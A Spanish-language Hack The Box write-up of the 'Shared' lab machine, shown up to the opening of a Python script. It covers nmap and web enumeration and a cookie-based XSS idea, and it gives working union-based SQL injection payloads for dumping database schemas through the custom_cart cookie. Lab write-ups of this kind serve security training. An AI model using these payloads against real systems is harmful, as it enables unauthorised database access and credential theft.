<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Shared" /><meta property="og:locale" content="en" /><meta name="description" content="Overview:" /><meta property="og:description" content="Overview:" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBShared/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBShared/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-15T16:21:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Shared" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-15T16:21:11-05:00","datePublished":"2022-08-15T16:21:11-05:00","description":"Overview:","headline":"Hackthebox Writeup Shared","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBShared/"},"url":"https://e1p0tr0.github.io/posts/HTBShared/"}</script><title>Hackthebox Writeup Shared | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Shared</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Shared</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guill√©n</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1660598471" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-15 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4344 words"> <em>24 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview:</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Database enumeration and SSH password leak by <strong>SQL Inyection</strong><li><strong>Remote command execution</strong> in IPython <strong>(CVE-2022-21699)</strong> (Foothold)<li><strong>Redis password leak</strong> exploiting a connection binary<li><strong>Remote command execution</strong> by running Lua commands <strong>(CVE-2022-0543)</strong> (Privilege Escalation)</ol><hr /><p><img data-src="/assets/img/htb/writeups/shared/logo.png" alt="SharedLogo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.172<td style="text-align: center">23 Jul 2022<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexi√≥n con la m√°quina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.172
PING 10.10.11.172 <span class="o">(</span>10.10.11.172<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.172: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>115 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.172 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 114.710/114.710/114.710/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicaci√≥n de par√°metros:</p><p>-c &lt;count&gt; : N√∫mero de paquetes ICMP que deseamos enviar a la m√°quina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.172
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 16:33 -05
Nmap scan report for 10.10.11.172
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
		\_________________ Secure Shell Protocol
80/tcp  open  http
		\_________________ Hypertext Transfer Protocol
443/tcp open  https
		\_________________ Hypertext Transfer Protocol Secure
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicaci√≥n de par√°metros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexi√≥n), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como m√≠nimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuesti√≥n (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Continuamos con un escaneo a profundidad de los puertos <strong>22(SSH) - 80(HTTP) - 443(HTTPS)</strong>:</p><blockquote><p>En esta ocasi√≥n usamos el formato <strong>XML(Extensible Markup Language)</strong> y con la herramienta <code class="language-plaintext highlighter-rouge">xsltproc</code> lo convertimos a formato <strong>HTML(Hypertext Markup Language)</strong>, luego compartimos un simple servidor HTTP:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -p22,80,443 -sCV 10.10.11.172 -oX tcp_openPorts
</span><span class="c">...
</span><span class="go">‚ùØ xsltproc tcp_openPorts -o tcp_openPorts.html
</span><span class="c">...
</span><span class="go">‚ùØ python3 -m http.server 80
</span><span class="c">...
</span></pre></table></code></div></div><p><img data-src="/assets/img/htb/writeups/shared/tcp_ports_scan.png" alt="TCPScan" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Explicaci√≥n de par√°metros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusi√≥n de par√°metros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detecci√≥n de versiones de los servicios que corren por los puertos</p><p>-oX &lt;file&gt; : Guardar el output del escaneo en un archivo con formato XML</p></blockquote><p>Observamos que con el script por defecto <code class="language-plaintext highlighter-rouge">http-robots.txt</code> se encontro el cl√°sico archivo <em>robots.txt</em> el cu√°l se encarga de ocultar a los motores de b√∫squeda (google, firefox, bing) cierto contenido de nuestra web, ya sean directorios, subdirectorios, rutas, archivos, etc.</p><p>Ahora empezamos buscando las tecnolog√≠as del servicio web <strong>80(HTTP)</strong>:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">‚ùØ whatweb 10.10.11.172
http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://shared.htb - no address for shared.htb &lt;---------- Virtual hosting
</span></pre></table></code></div></div><p>Observamos que se aplica <strong>Virtual Hosting</strong>, as√≠ que agregamos la IP de la m√°quina y el dominio a nuestro archivo encargado de la resoluci√≥n de direcciones IP y nombres de dominio <em>/etc/hosts</em>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.172 shared.htb" &gt;&gt; /etc/hosts</code></p><p>Ahora volvemos a buscar las tecnolog√≠as:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">‚ùØ whatweb 10.10.11.172
http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]
http://shared.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/], nginx[1.18.0]
https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
</span></pre></table></code></div></div><p>Por el lado de las tecnolog√≠as vemos un servidor web <code class="language-plaintext highlighter-rouge">Nginx/1.18.0</code> con una versi√≥n estable hasta la fecha, la biblioteca <code class="language-plaintext highlighter-rouge">JQuery</code> de <code class="language-plaintext highlighter-rouge">Javascript</code> para el tema de desarrollo web e interacci√≥n con documentos HTML, el E-commerce <code class="language-plaintext highlighter-rouge">Prestashop</code>, etc.</p><p>Aparte de ello observamos el flujo de redirecciones (3XX codes) <em>http://10.10.11.172 -&gt; http://shared.htb -&gt; https://shared.htb -&gt; https://shared.htb/index.php</em></p><blockquote><p>Para comprobarlo ingresamos con <code class="language-plaintext highlighter-rouge">Firefox</code>:</p></blockquote><p><img data-src="/assets/img/htb/writeups/shared/http_web.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><p>Al observar el landing page encontramos dos mensajes, uno sobre la ca√≠da de la p√°gina por un fallo de disco y otro de la implementaci√≥n de un nuevo proceso de pago. Tengamos en cuenta lo anterior para m√°s adelante</p><p>Toqueteando la p√°gina podemos encontrar una p√°gina de logeo, en mi caso no pude encontrarla de esa manera. Intente fuzear y solo encontr√© directorios con acceso prohibido (403 Forbidden), por ello realiz√© en un one-liner de <code class="language-plaintext highlighter-rouge">bash</code> la t√©cnica <strong>web scraping</strong> para extraer todas las posibles rutas de la web:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>‚ùØ curl <span class="nt">-sk</span> https://shared.htb/index.php | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s1">'"https:.*?"'</span> | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'\n'</span> | <span class="nb">tr</span> <span class="s1">','</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s1">'"https:.*?"'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'^https://$'</span> | <span class="nb">sed</span> <span class="s1">'s/&amp;amp;/\&amp;/g'</span>
...
https://shared.htb/index.php?controller<span class="o">=</span>authentication &lt;<span class="nt">--------</span> Login path
...
</pre></table></code></div></div><p>Al crearnos una cuenta se nos agrega una nueva cookie de sessi√≥n con el nombre <code class="language-plaintext highlighter-rouge">custom_cart</code>, √©l cual si observamos en las herramientas de desarrollador (pesta√±a storage), el valor analizado es un <strong>Array</strong>. Llegando a la conclusi√≥n de que aqu√≠ guardar√° cada objeto que a√±adamos a nuestro carrito de compras.</p><blockquote class="prompt-info"><div><p>Antes de seguir, al comprar un producto podemos escribir un comentario al respecto y al querer publicarlo nos muestra un mensaje diciendo que ser√° revisado por un moderador antes de publicarse. Pensando en ello podemos aplicar <strong>XSS(Cross-Site Scripting)</strong> para robarle las <strong>cookies</strong> a ese moderador y posiblemente tener una cuenta con mayores privilegios. Lamentablemente nunca llega a publicarse un comentario</p></div></blockquote><p>Siguiendo con el carrito de compras, al momento de proceder con el pago existe una redirecci√≥n a <em>https://checkout.shared.htb</em>. Realizamos el mismo paso de antes (saltamos la advertencia de ‚ÄúNot Secure‚Äù) y observamos una tabla con el <strong>ID</strong> del producto y la cantidad que elegimos.</p><blockquote class="prompt-tip"><div><p>Recordando la fase de descubrimiento de tecnolog√≠as, con la extensi√≥n <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> observamos que por detr√°s hay una base de datos <strong>MySQL</strong></p></div></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Sabemos que nuestra cookie <code class="language-plaintext highlighter-rouge">custom_cart</code> est√° codificada en formato <strong>URL</strong> y es reflejada en nuestro carro de compras:</p><blockquote><p>Podemos decodificar para validar el formato con <code class="language-plaintext highlighter-rouge">python</code> o <code class="language-plaintext highlighter-rouge">bash</code>:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="go">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
       ‚îÇ File: urldecode_data.txt
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span><span class="gp">   1   ‚îÇ #</span><span class="w"> </span>python3
<span class="gp">   2   ‚îÇ alias urldecode='python3 -c "import sys, urllib.parse as ul;</span><span class="w"> </span>print<span class="o">(</span>ul.unquote_plus<span class="o">(</span>sys.argv[1]<span class="o">))</span><span class="s2">"'
</span><span class="go">   3   ‚îÇ 
</span><span class="gp">   4   ‚îÇ #</span><span class="w"> </span>bash
<span class="go">   5   ‚îÇ echo "{url_data}" | sed -e "s/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g" | xargs -0 echo -e
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span></pre></table></code></div></div><p>Al insertar la salida de cualquier comando comprobamos que no es necesario que la cookie este codificada</p><p>Con el concepto que por detr√°s hay una <strong>base de datos MySQL</strong> y la interfaz del carrito de compras es presentada como una tabla, podemos intentar una posible <strong>SQL Inyeciton</strong></p><blockquote><p>Para mejor control interceptamos la p√°gina con <code class="language-plaintext highlighter-rouge">burpsuite</code>:</p></blockquote><p><img data-src="/assets/img/htb/writeups/shared/checkout_burpsuite.png" alt="CheckoutBurp" class="shadow" data-proofer-ignore></p><blockquote><p>Probamos una comilla simple (‚Äò) en cada campo de la cookie, para mejor entendimiento un <strong>diccionario ({key : value})</strong>:</p></blockquote><p>En el campo value <strong>1</strong> solo se refleja el input, por ello podemos inyectar codigo <strong>html</strong> y posiblemente un ataque <strong>XSS</strong></p><p>En el campo key <strong>53GG2EF8</strong>:</p><p><img data-src="/assets/img/htb/writeups/shared/validate_key_sqli.png" alt="ValidateKeySQLi" class="shadow" data-proofer-ignore></p><p>Tomamos la salida como un posible error e intentamos hallar la cantidad de columnas y un campo vulnerable:</p><p><img data-src="/assets/img/htb/writeups/shared/key_sqli.png" alt="KeySQLi" class="shadow" data-proofer-ignore></p><p>Ahora enumeramos las bases de datos existentes:</p><blockquote><p>Payload: <code class="language-plaintext highlighter-rouge">' union select 1,(select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata),3-- -</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/shared/databases_sqli.png" alt="DBSqli" class="shadow" data-proofer-ignore></p><p>Los pasos que siguen son enumerar las <strong>tablas, columnas y ver sus campos</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">--Tables of a database
' union select 1,2,3,group_concat(0x7c,table_name,0x7C) from information_schema.tables where table_schema=[database]

--Column names
' union select 1,2,3,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name=[table name]
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Esta y m√°s informaci√≥n lo encuentras en <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based">Hacktricks</a></p></div></blockquote><p>Lo que hice fue automatizar el proceso en un script en <code class="language-plaintext highlighter-rouge">python</code>, muy parecida a la m√°quina anterior pero con algunos cambios nuevos:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
